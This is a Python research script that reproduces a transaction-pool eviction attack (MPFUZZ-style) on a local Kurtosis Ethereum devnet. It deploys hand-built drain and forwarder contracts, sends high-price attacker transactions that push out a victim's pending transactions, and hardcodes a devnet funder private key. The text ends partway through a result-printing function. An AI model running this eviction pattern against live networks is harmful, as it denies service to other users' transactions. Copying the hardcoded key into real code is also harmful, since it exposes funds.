import argparse
import csv
import hashlib
import hmac
import json
import re
import secrets
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


ETHER = 10**18

DEFAULT_FUNDER = {
    "label": "funded0",
    "address": "0x8943545177806ED17B9F23F0a21ee5948eCaa776",
    "private_key": "0xbcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31",
}

SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP256K1_G = (
    55066263022277343669578718895168534326250603453777594175500187360389116729240,
    32670510020758816978083085130507043184471273380659243275938904335757337482424,
)
KECCAK_ROUNDS = [
    0x0000000000000001,
    0x0000000000008082,
    0x800000000000808A,
    0x8000000080008000,
    0x000000000000808B,
    0x0000000080000001,
    0x8000000080008081,
    0x8000000000008009,
    0x000000000000008A,
    0x0000000000000088,
    0x0000000080008009,
    0x000000008000000A,
    0x000000008000808B,
    0x800000000000008B,
    0x8000000000008089,
    0x8000000000008003,
    0x8000000000008002,
    0x8000000000000080,
    0x000000000000800A,
    0x800000008000000A,
    0x8000000080008081,
    0x8000000000008080,
    0x0000000080000001,
    0x8000000080008008,
]
KECCAK_ROTATION = [
    [0, 36, 3, 41, 18],
    [1, 44, 10, 45, 2],
    [62, 6, 43, 15, 61],
    [28, 55, 25, 21, 56],
    [27, 20, 39, 8, 14],
]
MASK64 = (1 << 64) - 1


class RpcError(RuntimeError):
    pass


class DeploymentDependencyError(RuntimeError):
    pass


class RpcClient:
    def __init__(self, url):
        self.url = url
        self.next_id = 1

    def call(self, method, params=None):
        payload = {
            "jsonrpc": "2.0",
            "id": self.next_id,
            "method": method,
            "params": params or [],
        }
        self.next_id += 1
        request = urllib.request.Request(
            self.url,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=10) as response:
                body = json.loads(response.read().decode("utf-8"))
        except urllib.error.URLError as exc:
            raise RpcError(f"cannot connect to {self.url}: {exc}") from exc
        if body.get("error"):
            raise RpcError(body["error"].get("message", str(body["error"])))
        return body.get("result")


class Tx:
    def __init__(self, label, sender_label, sender, nonce, price, gas_limit, to_address="", value=0, data="0x"):
        self.label = label
        self.sender_label = sender_label
        self.sender = sender
        self.nonce = nonce
        self.price = price
        self.gas_limit = gas_limit
        self.to_address = to_address
        self.value = value
        self.data = data
        self.hash = None
        self.error = None
        self.receipt = None


def parse_args():
    parser = argparse.ArgumentParser(description="Run MPFUZZ-style experiment 5 on a Kurtosis PoS devnet.")
    parser.add_argument(
        "--case",
        choices=[
            "contract-state-drain",
            "transfer-all",
            "transfer-contract-drain",
            "sender-balance-exhaustion",
            "value-forward-exhaustion",
        ],
        default="contract-state-drain",
        help=(
            "Experiment case. contract-state-drain keeps the original one-shot drain logic; "
            "transfer-all transfers pre-funded contract balance; sender-balance-exhaustion has "
            "X1-X4 carry msg.value into a payable forwarder so X1 drains x's spendable balance."
        ),
    )
    parser.add_argument("--rpc", default=None, help="EL HTTP RPC URL. Defaults to Kurtosis discovery.")
    parser.add_argument("--enclave", default="geth-lighthouse-devnet")
    parser.add_argument("--price-unit", type=int, default=1_000_000_000)
    parser.add_argument("--setup-price", type=int, default=10)
    parser.add_argument("--normal-price", type=int, default=3)
    parser.add_argument("--attacker-price", type=int, default=7)
    parser.add_argument("--fund-a-eth", type=int, default=100)
    parser.add_argument("--fund-x-eth", type=int, default=20)
    parser.add_argument("--contract-fund-eth", type=int, default=17)
    parser.add_argument("--sender-target-balance-eth", type=int, default=17)
    parser.add_argument("--forward-value-eth", type=int, default=10)
    parser.add_argument("--sender-gas-cap-eth", type=int, default=7)
    parser.add_argument("--deploy-gas", type=int, default=2_000_000)
    parser.add_argument("--call-gas", type=int, default=100_000)
    parser.add_argument("--receipt-timeout", type=int, default=180)
    parser.add_argument("--fresh-block-timeout", type=int, default=30)
    parser.add_argument(
        "--deploy-mode",
        choices=["auto", "web3", "raw"],
        default="auto",
        help="Contract deployment path: auto tries Web3.py/iBatch-style first, web3 requires dependencies, raw uses built-in bytecode.",
    )
    parser.add_argument("--contract-source", default=None, help="Solidity source for Web3.py deployment.")
    parser.add_argument("--contract-name", default=None, help="Contract name for Web3.py deployment.")
    parser.add_argument("--solc-version", default="0.8.20", help="Solidity compiler version for py-solc-x.")
    parser.add_argument("--evm-version", default="london", help="EVM version for Solidity compilation.")
    args = parser.parse_args()
    if args.case == "transfer-contract-drain":
        args.case = "transfer-all"
    if args.case == "value-forward-exhaustion":
        args.case = "sender-balance-exhaustion"
    return args


def discover_kurtosis_rpc(enclave):
    output = subprocess.check_output(["kurtosis", "enclave", "inspect", enclave], text=True)
    match = re.search(r"rpc:\s+8545/tcp\s+->\s+127\.0\.0\.1:(\d+)", output)
    if not match:
        raise RuntimeError(f"cannot find EL RPC port in kurtosis enclave inspect output for {enclave}")
    return f"http://127.0.0.1:{match.group(1)}"


def hex_to_int(value):
    if not value:
        return 0
    return int(value, 16)


def bytes_from_hex(value):
    if value in ("", None):
        return b""
    value = value[2:] if value.startswith("0x") else value
    return bytes.fromhex(value)


def rlp_int(value):
    if value == 0:
        return b""
    return value.to_bytes((value.bit_length() + 7) // 8, "big")


def rlp_encode(value):
    if isinstance(value, int):
        return rlp_encode(rlp_int(value))
    if isinstance(value, str):
        if value.startswith("0x"):
            return rlp_encode(bytes.fromhex(value[2:]))
        return rlp_encode(value.encode())
    if isinstance(value, bytes):
        if len(value) == 1 and value[0] < 0x80:
            return value
        if len(value) <= 55:
            return bytes([0x80 + len(value)]) + value
        length = rlp_int(len(value))
        return bytes([0xB7 + len(length)]) + length + value
    if isinstance(value, list):
        payload = b"".join(rlp_encode(item) for item in value)
        if len(payload) <= 55:
            return bytes([0xC0 + len(payload)]) + payload
        length = rlp_int(len(payload))
        return bytes([0xF7 + len(length)]) + length + payload
    raise TypeError(f"cannot RLP encode {type(value)!r}")


def rotl64(value, shift):
    if shift == 0:
        return value & MASK64
    return ((value << shift) | (value >> (64 - shift))) & MASK64


def keccak_f(state):
    for rc in KECCAK_ROUNDS:
        c = [state[x] ^ state[x + 5] ^ state[x + 10] ^ state[x + 15] ^ state[x + 20] for x in range(5)]
        d = [c[(x - 1) % 5] ^ rotl64(c[(x + 1) % 5], 1) for x in range(5)]
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] ^= d[x]

        b = [0] * 25
        for x in range(5):
            for y in range(5):
                b[y + 5 * ((2 * x + 3 * y) % 5)] = rotl64(state[x + 5 * y], KECCAK_ROTATION[x][y])

        for x in range(5):
            for y in range(5):
                state[x + 5 * y] = b[x + 5 * y] ^ ((~b[((x + 1) % 5) + 5 * y]) & b[((x + 2) % 5) + 5 * y])
                state[x + 5 * y] &= MASK64

        state[0] ^= rc


def keccak256(data):
    rate = 136
    state = [0] * 25
    padded = bytearray(data)
    padded.append(0x01)
    while len(padded) % rate != rate - 1:
        padded.append(0)
    padded.append(0x80)

    for offset in range(0, len(padded), rate):
        block = padded[offset : offset + rate]
        for index in range(rate // 8):
            lane = int.from_bytes(block[index * 8 : index * 8 + 8], "little")
            state[index] ^= lane
        keccak_f(state)

    output = bytearray()
    while len(output) < 32:
        for index in range(rate // 8):
            output.extend(state[index].to_bytes(8, "little"))
            if len(output) >= 32:
                break
        if len(output) < 32:
            keccak_f(state)
    return bytes(output[:32])


def point_add(left, right):
    if left is None:
        return right
    if right is None:
        return left
    x1, y1 = left
    x2, y2 = right
    if x1 == x2 and (y1 + y2) % SECP256K1_P == 0:
        return None
    if left == right:
        slope = (3 * x1 * x1) * pow(2 * y1, -1, SECP256K1_P)
    else:
        slope = (y2 - y1) * pow(x2 - x1, -1, SECP256K1_P)
    slope %= SECP256K1_P
    x3 = (slope * slope - x1 - x2) % SECP256K1_P
    y3 = (slope * (x1 - x3) - y1) % SECP256K1_P
    return x3, y3


def scalar_mult(scalar, point):
    result = None
    addend = point
    while scalar:
        if scalar & 1:
            result = point_add(result, addend)
        addend = point_add(addend, addend)
        scalar >>= 1
    return result


def deterministic_k(private_key, digest):
    x = private_key.to_bytes(32, "big")
    k = b"\x00" * 32
    v = b"\x01" * 32
    k = hmac.new(k, v + b"\x00" + x + digest, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    k = hmac.new(k, v + b"\x01" + x + digest, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    while True:
        v = hmac.new(k, v, hashlib.sha256).digest()
        candidate = int.from_bytes(v, "big")
        if 1 <= candidate < SECP256K1_N:
            return candidate
        k = hmac.new(k, v + b"\x00", hashlib.sha256).digest()
        v = hmac.new(k, v, hashlib.sha256).digest()


def sign_digest(private_key, digest):
    z = int.from_bytes(digest, "big")
    while True:
        k = deterministic_k(private_key, digest + secrets.token_bytes(1))
        point = scalar_mult(k, SECP256K1_G)
        r = point[0] % SECP256K1_N
        if r == 0:
            continue
        s = (pow(k, -1, SECP256K1_N) * (z + r * private_key)) % SECP256K1_N
        if s == 0:
            continue
        y_parity = point[1] & 1
        if s > SECP256K1_N // 2:
            s = SECP256K1_N - s
            y_parity ^= 1
        return y_parity, r, s


def sign_legacy_tx_with_data(private_key_hex, nonce, gas_price, gas_limit, to_address, value, data, chain_id):
    private_key = int(private_key_hex.removeprefix("0x"), 16)
    signing_parts = [
        nonce,
        gas_price,
        gas_limit,
        bytes_from_hex(to_address),
        value,
        bytes_from_hex(data),
        chain_id,
        0,
        0,
    ]
    signing_hash = keccak256(rlp_encode(signing_parts))
    y_parity, r, s = sign_digest(private_key, signing_hash)
    v = chain_id * 2 + 35 + y_parity
    raw = rlp_encode([nonce, gas_price, gas_limit, bytes_from_hex(to_address), value, bytes_from_hex(data), v, r, s])
    return "0x" + raw.hex(), "0x" + keccak256(raw).hex()


def selector(signature):
    return "0x" + keccak256(signature.encode("ascii"))[:4].hex()


def abi_address(address):
    raw = bytes_from_hex(address)
    if len(raw) != 20:
        raise ValueError(f"invalid ABI address: {address}")
    return b"\x00" * 12 + raw


def abi_uint256(value):
    if value < 0 or value >= 1 << 256:
        raise ValueError(f"invalid uint256 value: {value}")
    return value.to_bytes(32, "big")


def transfer_to_calldata(to_address, amount):
    return (
        selector("transferTo(address,uint256)")
        + abi_address(to_address).hex()
        + abi_uint256(amount).hex()
    )


def forward_to_calldata(to_address):
    return selector("forwardTo(address)") + abi_address(to_address).hex()


def is_sender_balance_case(case):
    return case == "sender-balance-exhaustion"


def checksum_address(w3, address):
    if hasattr(w3, "to_checksum_address"):
        return w3.to_checksum_address(address)
    return w3.toChecksumAddress(address)


def default_contract_source(case):
    if is_sender_balance_case(case):
        return "ValueForwarder.sol"
    if case == "transfer-all":
        return "TransferVault.sol"
    return "OneShotDrain.sol"


def default_contract_name(case):
    if is_sender_balance_case(case):
        return "ValueForwarder"
    if case == "transfer-all":
        return "TransferVault"
    return "OneShotDrain"


def deploy_label(case):
    if is_sender_balance_case(case):
        return "deploy value forwarder"
    if case == "transfer-all":
        return "deploy transfer contract"
    return "deploy drain contract"


def one_shot_creation_code(sink_address):
    sink = bytes_from_hex(sink_address)
    if len(sink) != 20:
        raise ValueError(f"invalid sink address: {sink_address}")
    runtime = (
        bytes.fromhex("60005415600c5760006000fd5b6001600055600060006000600047")
        + b"\x73"
        + sink
        + bytes.fromhex("5af115603b5760006000f35b60006000fd")
    )
    if len(runtime) != 65 or runtime[12] != 0x5B or runtime[59] != 0x5B:
        raise AssertionError("unexpected runtime layout")
    init = bytes.fromhex(f"60{len(runtime):02x}600c60003960{len(runtime):02x}6000f3")
    return "0x" + (init + runtime).hex()


def transfer_vault_creation_code():
    sig = bytes_from_hex(selector("transferTo(address,uint256)"))
    runtime = bytearray()

    # Dispatch only transferTo(address,uint256).
    runtime += b"\x60\x00\x35\x60\xe0\x1c\x63" + sig + b"\x14"
    entry_dest_pos = len(runtime) + 1
    runtime += b"\x60\x00\x57"
    runtime += b"\x60\x00\x60\x00\xfd"
    runtime[entry_dest_pos] = len(runtime)
    runtime += b"\x5b"

    # Revert when selfbalance < amount.
    runtime += b"\x60\x24\x35\x47\x90\x10\x15"
    enough_balance_dest_pos = len(runtime) + 1
    runtime += b"\x60\x00\x57"
    runtime += b"\x60\x00\x60\x00\xfd"
    runtime[enough_balance_dest_pos] = len(runtime)
    runtime += b"\x5b"

    # call(gas(), to, amount, 0, 0, 0, 0)
    runtime += b"\x60\x00\x60\x00\x60\x00\x60\x00\x60\x24\x35\x60\x04\x35\x5a\xf1"
    success_dest_pos = len(runtime) + 1
    runtime += b"\x60\x00\x57"
    runtime += b"\x60\x00\x60\x00\xfd"
    runtime[success_dest_pos] = len(runtime)
    runtime += b"\x5b\x60\x00\x60\x00\xf3"

    if len(runtime) > 255:
        raise AssertionError("transfer vault runtime is unexpectedly large")
    init = bytes.fromhex(f"60{len(runtime):02x}600c60003960{len(runtime):02x}6000f3")
    return "0x" + (init + runtime).hex()


def value_forwarder_creation_code():
    sig = bytes_from_hex(selector("forwardTo(address)"))
    runtime = bytearray()

    # Dispatch only forwardTo(address).
    runtime += b"\x60\x00\x35\x60\xe0\x1c\x63" + sig + b"\x14"
    entry_dest_pos = len(runtime) + 1
    runtime += b"\x60\x00\x57"
    runtime += b"\x60\x00\x60\x00\xfd"
    runtime[entry_dest_pos] = len(runtime)
    runtime += b"\x5b"

    # Require msg.value > 0.
    runtime += b"\x34\x15\x15"
    has_value_dest_pos = len(runtime) + 1
    runtime += b"\x60\x00\x57"
    runtime += b"\x60\x00\x60\x00\xfd"
    runtime[has_value_dest_pos] = len(runtime)
    runtime += b"\x5b"

    # call(gas(), to, msg.value, 0, 0, 0, 0)
    runtime += b"\x60\x00\x60\x00\x60\x00\x60\x00\x34\x60\x04\x35\x5a\xf1"
    success_dest_pos = len(runtime) + 1
    runtime += b"\x60\x00\x57"
    runtime += b"\x60\x00\x60\x00\xfd"
    runtime[success_dest_pos] = len(runtime)
    runtime += b"\x5b\x60\x00\x60\x00\xf3"

    if len(runtime) > 255:
        raise AssertionError("value forwarder runtime is unexpectedly large")
    init = bytes.fromhex(f"60{len(runtime):02x}600c60003960{len(runtime):02x}6000f3")
    return "0x" + (init + runtime).hex()


def dependency_install_hint(solc_version):
    return (
        "Install Web3.py/iBatch-style deployment dependencies with:\n"
        "  python3 -m pip install web3 py-solc-x\n"
        f"  python3 -c \"from solcx import install_solc; install_solc('{solc_version}')\""
    )


def compile_with_solc(source, contract_name, solc_version, evm_version):
    try:
        from solc import compile_source

        compiled = compile_source(source)
    except Exception as solc_error:
        try:
            from solcx import compile_source
            from solcx.exceptions import SolcNotInstalled

            try:
                compiled = compile_source(source, solc_version=solc_version, evm_version=evm_version)
            except SolcNotInstalled as exc:
                raise DeploymentDependencyError(dependency_install_hint(solc_version)) from exc
        except ModuleNotFoundError as exc:
            raise DeploymentDependencyError(dependency_install_hint(solc_version)) from solc_error

    for key, interface in compiled.items():
        if key.endswith(f":{contract_name}"):
            return interface
    raise RuntimeError(f"cannot find compiled contract named {contract_name}")


def add_signing_middleware(w3, account):
    try:
        from web3.middleware import SignAndSendRawMiddlewareBuilder

        w3.middleware_onion.add(SignAndSendRawMiddlewareBuilder.build(account))
        return
    except ImportError:
        pass

    try:
        from web3.middleware import construct_sign_and_send_raw_middleware

        w3.middleware_onion.add(construct_sign_and_send_raw_middleware(account))
        return
    except ImportError as exc:
        raise DeploymentDependencyError("Web3.py signing middleware is unavailable in this installation") from exc


def load_key_csv(path):
    accounts = {}
    with open(path, newline="", encoding="utf-8") as handle:
        reader = csv.DictReader(handle)
        for row in reader:
            label = row["label"].strip()
            accounts[label] = {
                "label": label,
                "address": row["pub_key"].strip(),
                "private_key": row["priv_key"].strip(),
            }
    accounts[DEFAULT_FUNDER["label"]] = DEFAULT_FUNDER
    return accounts


def balance(rpc, address):
    return hex_to_int(rpc.call("eth_getBalance", [address, "latest"]))


def wait_receipt(rpc, tx_hash, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            receipt = rpc.call("eth_getTransactionReceipt", [tx_hash])
        except RpcError as exc:
            if "transaction indexing is in progress" not in str(exc):
                raise
            time.sleep(1)
            continue
        if receipt:
            return receipt
        time.sleep(1)
    return None


def wait_fresh_block(rpc, timeout):
    start = hex_to_int(rpc.call("eth_blockNumber"))
    deadline = time.time() + timeout
    print(f"waiting for a fresh PoS block after {start}")
    while time.time() < deadline:
        current = hex_to_int(rpc.call("eth_blockNumber"))
        if current > start:
            print(f"freshBlock={current}")
            return current
        time.sleep(0.25)
    raise RuntimeError(f"no fresh block after {timeout}s")


def send(rpc, chain_id, accounts, tx, price_unit):
    account = accounts[tx.sender_label]
    raw, expected_hash = sign_legacy_tx_with_data(
        account["private_key"],
        tx.nonce,
        tx.price * price_unit,
        tx.gas_limit,
        tx.to_address,
        tx.value,
        tx.data,
        chain_id,
    )
    try:
        tx.hash = rpc.call("eth_sendRawTransaction", [raw])
        print(f"sent: {tx.label:<28} hash={tx.hash}")
        if tx.hash.lower() != expected_hash.lower():
            print(f"warning: local hash {expected_hash} differs from RPC hash {tx.hash}")
    except RpcError as exc:
        tx.hash = expected_hash
        tx.error = str(exc)
        print(f"rejected: {tx.label:<24} err={tx.error}")
    return tx


def pool_locations(content):
    locations = {}
    for side in ("pending", "queued"):
        for txs in content.get(side, {}).values():
            for tx in txs.values():
                tx_hash = tx.get("hash", "").lower()
                if tx_hash:
                    locations[tx_hash] = side
    return locations


def location_of(tx, locations):
    if not tx.hash:
        return "rejected"
    return locations.get(tx.hash.lower(), "dropped")


def snapshot(rpc, label, known):
    status = rpc.call("txpool_status")
    content = rpc.call("txpool_content")
    locations = pool_locations(content)
    pending = hex_to_int(status["pending"])
    queued = hex_to_int(status["queued"])

    print(f"\n========== {label} ==========")
    print(f"status: pending={pending} queued={queued} all={pending + queued}")
    for tx in known:
        print(
            f"  {tx.label:<28} "
            f"from={tx.sender_label} "
            f"nonce={tx.nonce} "
            f"price={tx.price} "
            f"valueWei={tx.value} "
            f"gas={tx.gas_limit} "
            f"location={location_of(tx, locations):<8} "
            f"hash={tx.hash or tx.error}"
        )
    return locations


def print_receipt(tx):
    receipt = tx.receipt
    contract_part = f" contract={receipt.get('contractAddress')}" if receipt.get("contractAddress") else ""
    print(
        f"receipt: {tx.label:<28} "
        f"status={receipt.get('status')} "
        f"block={hex_to_int(receipt.get('blockNumber'))} "
        f"txIndex={hex_to_int(receipt.get('transactionIndex'))} "
        f"gasUsed={hex_to_int(receipt.get('gasUsed'))}"
        f"{contract_part}"
    )


def wait_targets(rpc, targets, timeout):
    for tx in targets:
        if not tx.hash or tx.error:
            raise RuntimeError(f"cannot wait for rejected transaction {tx.label}: {tx.error}")
        receipt = wait_receipt(rpc, tx.hash, timeout)
        if not receipt:
            raise RuntimeError(f"no receipt for {tx.label}: {tx.hash}")
        tx.receipt = receipt
        print_receipt(tx)


def sender_target_balance(args):
    return args.sender_target_balance_eth * ETHER


def sender_workload_price_unit(args):
    if not is_sender_balance_case(args.case):
        return args.price_unit
    denominator = args.attacker_price * args.call_gas
    if denominator <= 0:
        raise RuntimeError("attacker price and call gas must be positive")
    unit = (args.sender_gas_cap_eth * ETHER) // denominator
    if unit <= 0:
        raise RuntimeError("computed sender-balance workload price unit is zero")
    return unit


def deployment_account_label(args):
    if is_sender_balance_case(args.case):
        return DEFAULT_FUNDER["label"]
    return "x"


def deployment_value(args):
    if is_sender_balance_case(args.case):
        return 0
    return args.contract_fund_eth * ETHER


def fund_accounts(rpc, chain_id, accounts, args):
    funder = accounts[DEFAULT_FUNDER["label"]]
    nonce = hex_to_int(rpc.call("eth_getTransactionCount", [funder["address"], "pending"]))
    x_fund_value = args.fund_x_eth * ETHER
    if is_sender_balance_case(args.case):
        current_x_balance = balance(rpc, accounts["x"]["address"])
        target_x_balance = sender_target_balance(args)
        if current_x_balance > target_x_balance:
            raise RuntimeError(
                "x already has more than the sender-balance target; restart the devnet "
                "or raise --sender-target-balance-eth"
            )
        x_fund_value = target_x_balance - current_x_balance
    txs = [
        Tx("fund A", funder["label"], funder["address"], nonce, args.setup_price, 21_000, accounts["a"]["address"], args.fund_a_eth * ETHER),
    ]
    if x_fund_value:
        txs.append(
            Tx(
                "fund X to sender target" if is_sender_balance_case(args.case) else "fund X",
                funder["label"],
                funder["address"],
                nonce + 1,
                args.setup_price,
                21_000,
                accounts["x"]["address"],
                x_fund_value,
            )
        )
    print("\n========== setup: fund old exp5 accounts ==========")
    for tx in txs:
        send(rpc, chain_id, accounts, tx, args.price_unit)
    wait_targets(rpc, txs, args.receipt_timeout)


def deploy_contract(rpc, chain_id, accounts, args):
    if args.deploy_mode in ("auto", "web3"):
        try:
            return deploy_contract_web3_style(rpc, chain_id, accounts, args)
        except DeploymentDependencyError as exc:
            if args.deploy_mode == "web3":
                raise
            print("\n========== setup: Web3.py deployment unavailable ==========")
            print(str(exc))
            print("falling back to signed raw creation tx with built-in bytecode")
    return deploy_contract_raw_style(rpc, chain_id, accounts, args)


def deploy_contract_web3_style(rpc, chain_id, accounts, args):
    try:
        from web3 import Web3
    except ModuleNotFoundError as exc:
        raise DeploymentDependencyError(dependency_install_hint(args.solc_version)) from exc

    exp_dir = Path(__file__).resolve().parent
    contract_name = args.contract_name or default_contract_name(args.case)
    source_path = Path(args.contract_source) if args.contract_source else exp_dir / default_contract_source(args.case)
    source = source_path.read_text(encoding="utf-8")
    interface = compile_with_solc(source, contract_name, args.solc_version, args.evm_version)
    bytecode = interface.get("bin") or interface.get("bytecode")
    if not bytecode:
        raise RuntimeError("compiled contract did not include deployment bytecode")
    if not bytecode.startswith("0x"):
        bytecode = "0x" + bytecode

    w3 = Web3(Web3.HTTPProvider(args.rpc_url))
    deployer_label = deployment_account_label(args)
    deployer = accounts[deployer_label]
    deployer_account = w3.eth.account.from_key(deployer["private_key"])
    add_signing_middleware(w3, deployer_account)

    deployer_address = checksum_address(w3, deployer["address"])
    a_address = checksum_address(w3, accounts["a"]["address"])
    if hasattr(w3.eth, "default_account"):
        w3.eth.default_account = deployer_address
    else:
        w3.eth.defaultAccount = deployer_address

    nonce = hex_to_int(rpc.call("eth_getTransactionCount", [deployer["address"], "pending"]))
    contract = w3.eth.contract(abi=interface["abi"], bytecode=bytecode)
    tx_params = {
        "from": deployer_address,
        "value": deployment_value(args),
        "gas": args.deploy_gas,
        "gasPrice": args.setup_price * args.price_unit,
        "nonce": nonce,
        "chainId": chain_id,
    }
    print("\n========== setup: deploy experiment contract ==========")
    print("deployment style: iBatch/Web3.py compile_source + contract.constructor().transact()")
    print(f"case={args.case}")
    print(f"source={source_path}")
    print(f"contractName={contract_name}")
    print(f"solcVersion={args.solc_version} evmVersion={args.evm_version}")
    print(f"deployer={deployer_label} {deployer['address']}")
    if deployment_value(args):
        print(f"funding contract with {args.contract_fund_eth} ETH from {deployer_label}")
    else:
        print("deploying empty contract; X transactions will carry msg.value")
    try:
        if args.case in ("transfer-all", "sender-balance-exhaustion"):
            tx_hash = contract.constructor().transact(tx_params)
        else:
            tx_hash = contract.constructor(a_address).transact(tx_params)
    except Exception as exc:
        raise RuntimeError("contract.constructor(...).transact() failed") from exc

    tx_hash_hex = tx_hash.hex() if hasattr(tx_hash, "hex") else str(tx_hash)
    if not tx_hash_hex.startswith("0x"):
        tx_hash_hex = "0x" + tx_hash_hex
    tx = Tx(deploy_label(args.case), deployer_label, deployer["address"], nonce, args.setup_price, args.deploy_gas)
    tx.hash = tx_hash_hex
    print(f"sent: {tx.label:<28} hash={tx.hash}")
    wait_targets(rpc, [tx], args.receipt_timeout)
    if tx.receipt.get("status") != "0x1" or not tx.receipt.get("contractAddress"):
        raise RuntimeError("contract deployment failed")
    contract_address = tx.receipt["contractAddress"]
    print(f"contract={contract_address}")
    print(f"contractBalanceWei={balance(rpc, contract_address)}")
    return contract_address


def deploy_contract_raw_style(rpc, chain_id, accounts, args):
    deployer_label = deployment_account_label(args)
    deployer = accounts[deployer_label]
    nonce = hex_to_int(rpc.call("eth_getTransactionCount", [deployer["address"], "pending"]))
    if args.case == "transfer-all":
        data = transfer_vault_creation_code()
    elif is_sender_balance_case(args.case):
        data = value_forwarder_creation_code()
    else:
        data = one_shot_creation_code(accounts["a"]["address"])
    tx = Tx(
        deploy_label(args.case),
        deployer_label,
        deployer["address"],
        nonce,
        args.setup_price,
        args.deploy_gas,
        "",
        deployment_value(args),
        data,
    )
    print("\n========== setup: deploy experiment contract ==========")
    print(f"case={args.case}")
    if args.case == "transfer-all":
        print("deployment style: signed raw creation tx with hand-built TransferVault bytecode")
    elif is_sender_balance_case(args.case):
        print("deployment style: signed raw creation tx with hand-built ValueForwarder bytecode")
    else:
        print("deployment style: signed raw creation tx with hand-built OneShotDrain bytecode")
    send(rpc, chain_id, accounts, tx, args.price_unit)
    wait_targets(rpc, [tx], args.receipt_timeout)
    if tx.receipt.get("status") != "0x1" or not tx.receipt.get("contractAddress"):
        raise RuntimeError("contract deployment failed")
    contract_address = tx.receipt["contractAddress"]
    print(f"contract={contract_address}")
    print(f"contractBalanceWei={balance(rpc, contract_address)}")
    return contract_address


def build_normal(accounts, start_nonce, price):
    return [
        Tx(f"A{index + 1} normal price={price}", "a", accounts["a"]["address"], start_nonce + index, price, 21_000, accounts["a"]["address"], 1)
        for index in range(4)
    ]


def build_attacker(accounts, contract_address, start_nonce, price, call_gas, args):
    if args.case == "transfer-all":
        data = transfer_to_calldata(accounts["a"]["address"], args.contract_fund_eth * ETHER)
        label_prefix = "transferTo(all)"
        value = 0
    elif is_sender_balance_case(args.case):
        data = forward_to_calldata(accounts["a"]["address"])
        label_prefix = f"forwardTo(value={args.forward_value_eth} ETH)"
        value = args.forward_value_eth * ETHER
    else:
        data = selector("drain()")
        label_prefix = "drain()"
        value = 0
    return [
        Tx(
            f"X{index + 1} {label_prefix} price={price}",
            "x",
            accounts["x"]["address"],
            start_nonce + index,
            price,
            call_gas,
            contract_address,
            value,
            data,
        )
        for index in range(4)
    ]


def labels_at(txs, locations, location):
    return [tx.label for tx in txs if location_of(tx, locations) == location]


def print_pool_result(normal, attacker, locations):
    a_pending = labels_at(normal, locations, "pending")
    a_queued = labels_at(normal, locations, "queued")
    a_not_pending = [tx.label for tx in normal if location_of(tx, locations) != "pending"]
    x_pending = labels_at(attacker, locations, "pending")
    x_queued = labels_at(attacker, locations, "queued")
    x_not_pending = [tx.label for tx in attacker if location_of(tx, locations) != "pending"]
    print("\nresult: txpool state after X1-X4 contract calls")
    print(f"  A pending: {a_pending}")
    print(f"  A queued: {a_queued}")
    print(f"  A dropped/not pending: {a_not_pending}")
    print(f"  X pending: {x_pending}")
    print(f"  X queued: {x_queued}")
    print(f"  X dropped/not pending: {x_not_pending}")
    if len(a_not_pending) == 4 and len(x_pending) == 4 and not a_queued and not x_queued:
        print("PASS: txpool admits all high-price contract-call X transactions and removes A")
    else:
        print("CHECK: txpool state differs from the expected price-only contract-call pattern")


def print_sender_pool_result(normal, attacker, locations):
    a_pending = labels_at(normal, locations, "pending")
    a_queued = labels_at(normal, locations, "queued")
    a_not_pending = [tx.label for tx in normal if location_of(tx, locations) != "pending"]
    x_pending = labels_at(attacker, locations, "pending")
    x_queued = labels_at(attacker, locations, "queued")
    x_not_pending = [tx.label for tx in attacker if location_of(tx, locations) != "pending"]

    print("\nresult: txpool state after sender-balance X1-X4 contract calls")
    print(f"  A pending: {a_pending}")
    print(f"  A queued: {a_queued}")
    print(f"  A dropped/not pending: {a_not_pending}")
    print(f"  X pending: {x_pending}")
    print(f"  X queued: {x_queued}")
    print(f"  X dropped/not pending: {x_not_pending}")
    if a_not_pending and x_pending == [attacker[0].label] and not x_queued and all(location_of(tx, locations) != "pending" for tx in attacker[1:]):
        print("PASS: X1 enters and evicts a lower-price A slot; X2-X4 stay out under sender balance constraints")
    elif len(a_not_pending) == 4 and len(x_pending) == 4 and not a_queued and not x_queued:
        print("PASS: txpool admits all X calls before execution; sender-balance exhaustion appears only after X1 executes")
    else:
        print("CHECK: txpool state differs from the expected sender-balance pattern")


def print_execution_result(normal, attacker, contract_address, rpc, args):
    x_statuses = [tx.receipt.get("status") if tx.receipt else None for tx in attacker]
    a_receipts = [rpc.call("eth_getTransactionReceipt", [tx.hash]) for tx in normal]
    print("\nresult: execution state after PoS block production")
    print(f"  X receipt statuses: {x_statuses}")
    print(f"  A receipts: {[receipt is not None for receipt in a_receipts]}")
    print(f"  contractBalanceWei={balance(rpc, contract_address)}")
    if x_statuses == ["0x1", "0x0", "0x0", "0x0"] and not any(a_receipts) and balance(rpc, contract_address) == 0:
        if args.case == "transfer-all":
            print("PASS: X1 transfers all contract funds; X2-X4 stay txpool-valid but revert at execution")
        else:
            print("PASS: X1 drains the contract state; X2-X4 stay txpool-valid but revert at execution")
    else:
        print("CHECK: execution statuses differ from the expected contract-state pattern")


def print_sender_balance_result(normal, attacker, contract_address, rpc, accounts, args, price_unit):
    for tx in attacker:
        if tx.hash and not tx.receipt:
            tx.receipt = rpc.call("eth_getTransactionReceipt", [tx.hash])
    x_statuses = [tx.receipt.get("status") if tx.receipt else None for tx in attacker]
    a_receipts = [rpc.call("eth_getTransactionReceipt", [tx.hash]) for tx in normal]
    x_balance = balance(rpc, accounts["x"]["address"])
    a_balance = balance(rpc, accounts["a"]["address"])
    contract_balance = balance(rpc, contract_address)
    upfront_cost = args.forward_value_eth * ETHER + args.attacker_price * price_unit * args.call_gas

    print("\nresult: sender-balance execution state after PoS block production")
    print(f"  X receipt statuses: {x_statuses}")
